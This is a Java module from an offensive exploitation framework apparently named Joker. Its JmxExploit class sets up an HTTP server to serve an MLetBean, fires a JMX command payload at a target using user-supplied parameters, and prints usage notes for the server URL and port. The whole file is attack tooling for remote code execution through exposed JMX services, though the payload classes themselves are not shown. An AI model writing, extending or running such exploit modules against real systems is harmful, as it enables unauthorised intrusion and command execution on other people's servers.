package com.lucifaer.jokerframework.modules.exploits;

import com.lucifaer.jokerframework.core.shell.config.DefaultDocumentation;
import com.lucifaer.jokerframework.data.JokerContext;
import com.lucifaer.jokerframework.modules.Exploit;
import com.lucifaer.jokerframework.modules.Payload;
import com.lucifaer.jokerframework.plugins.Server;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Component
public class JmxExploit implements Exploit {
    @Autowired
    @Qualifier("jmxCommand")
    private Payload payload;

    @Autowired
    @Qualifier("jmxHttpServer")
    private Server server;

    @Autowired
    JokerContext jokerContext;

    @Autowired
    DefaultDocumentation documentation;

    private Map<String, String> params;

    @Override
    public void exploit() {
        params = jokerContext.getCurrentShellContext().getParams();
        try {
            server.createServer();
            payload.init(params);
            payload.exploit();
            server.stopServer();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getExploitName() {
        return "jmx";
    }

    @Override
    public List<String[]> documentation() {
        params = jokerContext.getCurrentShellContext().getParams();
        List<String[]> document = new ArrayList<>();
        document.add( documentation.defaultExploitDocumentation());
        document.add(documentation.defaultPayloadDocumentation());
        document.add(new String[] {
                "--------------------------------------------------",
                "[options] Jmx install http server configurations: ",
                "By default, Joker start http://0.0.0.0:9999 as this payload's MLetBean install http server.",
                "You can set below options to finger out your own MLetBean http server",
                "   [serverUrl]                " + params.get("serverUrl") + "\t\tserver's url eg: http://127.0.0.1",
                "   [serverPort]               " + params.get("serverPort") + "\t\tserver's port. eg: 9999",
        });
        return document;
    }
}
